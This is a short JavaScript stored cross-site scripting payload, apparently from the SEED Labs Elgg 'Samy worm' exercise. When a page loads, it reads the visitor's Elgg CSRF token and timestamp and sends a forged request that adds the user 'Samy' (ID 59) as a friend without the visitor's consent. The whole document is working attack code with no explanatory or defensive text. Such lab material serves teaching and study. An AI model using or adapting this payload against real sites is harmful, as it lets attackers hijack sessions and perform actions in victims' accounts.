<script type="text/javascript">
window.onload = function() {
    // Get the CSRF token and timestamp
    var Ajax = null;
    var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
    var token = "&__elgg_token=" + elgg.security.token.__elgg_token;

    // Construct the URL to add Samy as a friend
    var friend_id = "59"; // Replace 59 with Samy’s user ID
    var sendurl = "http://www.seed-server.com/action/friends/add?friend=" + friend_id + ts + token;

    // Send the HTTP request
    var Ajax = new XMLHttpRequest();
    Ajax.open("GET", sendurl, true);
    Ajax.send();
};
</script>